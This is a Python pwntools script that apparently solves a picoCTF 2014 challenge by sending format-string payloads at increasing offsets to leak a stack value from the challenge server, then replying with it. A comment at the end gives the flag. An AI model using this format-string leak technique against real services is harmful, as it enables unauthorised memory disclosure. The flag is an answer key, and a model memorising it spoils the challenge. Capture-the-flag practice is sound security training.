#!/usr/bin/env python

from pwn import *

offset = 1
while True:
	r = remote('vuln2014.picoctf.com', 4546)
	payload = '%{}$x'.format(str(offset))
	log.info('payload: ' + payload)

	r.recvline()
	r.sendline(payload)
	leaked = str(int(r.recvline().strip().split(', ')[1], 16))
	log.info('leaked: ' + leaked)
	r.sendline(leaked)
	resp = r.recvall().strip()
	if 'I knew' not in resp:
		print resp
		break

	offset += 1

# flag: leak_the_seakret